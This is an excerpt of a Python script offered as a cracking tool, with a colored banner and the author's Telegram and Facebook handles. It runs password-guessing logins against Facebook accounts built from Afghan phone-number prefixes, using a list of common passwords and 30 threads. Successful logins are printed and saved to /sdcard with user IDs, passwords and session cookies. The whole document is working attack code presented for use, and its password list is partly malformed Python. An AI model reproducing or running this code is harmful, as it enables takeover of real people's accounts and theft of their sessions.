...
\033[1;91m    ▇▇▇◣╲▇╱◢▇▇▇\033[1;0m                                                                           
\033[1;97m--------------------------------------------------
\033[1;91m Author      : MRx_Sajad-BRO 
\033[1;91m Facebook : MRx Sajad jafari
\033[1;91m Telegram CH: https://t.me/NOOR_TECH_538
\033[1;91m Telegram  :@AMiR_ALi1500 
...
def afg_randome():
	...
	os.system('clear')
	print(logo)
	print('[+] For AFG (070,,078,077,079,074,076,0700)ETC....')
	print(47*'-')
	...
	with tred(max_workers=30) as ahd:
		...
		for guru in user:
			ids = kode+guru
			bro_pass = [ids,guru,'100200','700800','afghanistan','afghan1234','khan123','khan12345','600700','800900','786786','۱۲۳۴۵۶','۱۲۳۴۵۶۷۸۹',@ali123,@ALiking123,@Zakarya123,@king123,sex123,sex1234,sex123456789,king123,mother123,Hack123,janan123,janan420,@NOoR420,1234567890,@2010,@2004,@2008,@2009,0781234,Ehsan12345678,Ehsan123,ehsan070,@pubg123,@noorafg,noor123,Fuck123,]
			ahd.submit(rndm,ids,bro_pass)
	print(47*'\n\033[1;37m-')
	print('[✓] Crack process has been completed')
	print('[?] Total Ok Id Save in  /sdcard/BRO-OK.txt')
	print('[?] Total Cp Id Save in  /sdcard/BRO-CP.txt')
	print(47*'-')
	print(' Press Inter To Back Menu')
#---------------------START-CRACK---------------------#
def rndm(ids,bro_pass):
	try:
		global ok,loop
		sys.stdout.write('\r\r\033[1;37m [BRO-CRACK] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in bro_pass:
			...
			if 'session_key' in po:
				...
				print('\r\r\033[1;32m [BRO-OK] '+str(uid)+' | '+pas+'\033[1;97m')
				print('\r\r\033[1;32m [COOKIES] %s   '%(coki))
				open('/sdcard/BRO-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
				oks.append(str(uid))
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = po['error']['error_data']['uid']
				print('\r\r\x1b[1;33m [BRO-CP] '+str(uid)+' | '+pas+'\033[1;97m')
				open('/sdcard/BRO-CP.txt','a').write(str(uid)+'|'+pas+'\n')
				cps.append(str(uid))
				break
			else:continue
		loop+=1
